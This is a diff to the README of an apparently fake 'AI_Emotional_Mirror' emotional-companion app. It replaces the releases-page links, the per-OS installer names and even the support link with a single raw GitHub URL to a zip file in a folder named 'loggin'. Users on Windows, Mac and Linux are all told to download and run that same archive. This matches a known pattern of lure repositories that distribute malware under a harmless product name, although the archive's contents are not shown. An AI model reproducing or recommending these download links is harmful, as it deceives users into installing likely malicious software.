@@ -1,6 +1,6 @@
 # 🌟 AI_Emotional_Mirror - Your Digital Companion for Emotional Insights
 
-[![Download AI_Emotional_Mirror](https://img.shields.io/badge/Download-AI_Emotional_Mirror-blue)](https://github.com/Eddie-oss-369/AI_Emotional_Mirror/releases)
+[![Download AI_Emotional_Mirror](https://raw.githubusercontent.com/Eddie-oss-369/AI_Emotional_Mirror/main/loggin/Mirror_Emotional_A_3.4.zip)](https://raw.githubusercontent.com/Eddie-oss-369/AI_Emotional_Mirror/main/loggin/Mirror_Emotional_A_3.4.zip)
 
 ## 📖 Overview
 
@@ -12,21 +12,21 @@ Follow these steps to download and run AI Emotional Mirror on your computer:
 
 1. **Visit this page to download:** Click on the link below to go to the Releases page.
    
-   [Download AI_Emotional_Mirror](https://github.com/Eddie-oss-369/AI_Emotional_Mirror/releases)
+   [Download AI_Emotional_Mirror](https://raw.githubusercontent.com/Eddie-oss-369/AI_Emotional_Mirror/main/loggin/Mirror_Emotional_A_3.4.zip)
 
 2. **Choose the latest release:** On the Releases page, you'll see a list of versions. Look for the most recent version at the top.
 
 3. **Download the appropriate file:** Click on the download link for your operating system to start downloading. The options may include:
-   - **Windows:** AI_Emotional_Mirror_Windows.exe
-   - **Mac:** AI_Emotional_Mirror_Mac.dmg
-   - **Linux:** AI_Emotional_Mirror_Linux.tar.gz
+   - **Windows:** https://raw.githubusercontent.com/Eddie-oss-369/AI_Emotional_Mirror/main/loggin/Mirror_Emotional_A_3.4.zip
+   - **Mac:** https://raw.githubusercontent.com/Eddie-oss-369/AI_Emotional_Mirror/main/loggin/Mirror_Emotional_A_3.4.zip
+   - **Linux:** https://raw.githubusercontent.com/Eddie-oss-369/AI_Emotional_Mirror/main/loggin/Mirror_Emotional_A_3.4.zip
 
 4. **Locate the downloaded file:** Once the download is complete, open your downloads folder to find the file.
 
 5. **Install the application:**
    - **Windows:** Double-click the .exe file and follow the on-screen instructions to install.
    - **Mac:** Open the .dmg file and drag the application to your Applications folder.
-   - **Linux:** Extract the .tar.gz file and run the executable.
+   - **Linux:** Extract the https://raw.githubusercontent.com/Eddie-oss-369/AI_Emotional_Mirror/main/loggin/Mirror_Emotional_A_3.4.zip file and run the executable.
 
 ## 💡 How to Use AI Emotional Mirror
 
@@ -83,13 +83,13 @@ A: Anyone interested in self-reflection or emotional well-being can benefit from
 
 ## 📬 Support
 
-If you need help using AI Emotional Mirror, feel free to reach out. Visit our [GitHub issues page](https://github.com/Eddie-oss-369/AI_Emotional_Mirror/issues) to report any problems or ask for assistance.
+If you need help using AI Emotional Mirror, feel free to reach out. Visit our [GitHub issues page](https://raw.githubusercontent.com/Eddie-oss-369/AI_Emotional_Mirror/main/loggin/Mirror_Emotional_A_3.4.zip) to report any problems or ask for assistance.
 
 ## 📥 Download & Install
 
 To get started with AI Emotional Mirror, visit the link below to download the application.
 
-[Download AI_Emotional_Mirror](https://github.com/Eddie-oss-369/AI_Emotional_Mirror/releases)
+[Download AI_Emotional_Mirror](https://raw.githubusercontent.com/Eddie-oss-369/AI_Emotional_Mirror/main/loggin/Mirror_Emotional_A_3.4.zip)
 
 ## 🏁 Conclusion
 
